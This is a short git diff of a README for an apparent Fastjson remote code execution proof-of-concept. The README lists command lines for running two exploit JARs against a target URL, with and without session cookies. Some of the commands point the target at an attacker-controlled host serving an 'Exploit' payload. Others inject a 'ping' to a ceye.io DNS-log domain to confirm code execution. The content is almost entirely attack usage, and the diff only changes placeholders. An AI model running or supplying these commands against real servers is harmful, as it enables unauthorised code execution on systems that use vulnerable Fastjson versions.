@@ -2,13 +2,14 @@
 Fastjson-POC
 
 # 有cookies
-java -jar fastjson-2019-Rce.jar http://attackURL/ aaaaa.ceye.io/test cookies
 
-java -jar fast-2018-Rce.jar http://attackURL/ cookies "ping test.ceye.io"
+java -jar fastjson-2019-Rce.jar http://url/ xxx.xxx.xxx.xxx/Exploit cookies
+
+java -jar fast-2018-Rce.jar http://url/ cookies "ping test.ceye.io"
 
 
 # 无cookies
 
-java -jar fastjson-2019-Rce.jar http://attackURL/ aaaaa.ceye.io/test null
+java -jar fastjson-2019-Rce.jar http://url/ xxx.xxx.xxx.xxx/Exploit null
 
-java -jar fast-2018-Rce.jar http://attackURL/ null "ping test.ceye.io"
+java -jar fast-2018-Rce.jar http://url/ null "ping test.ceye.io"
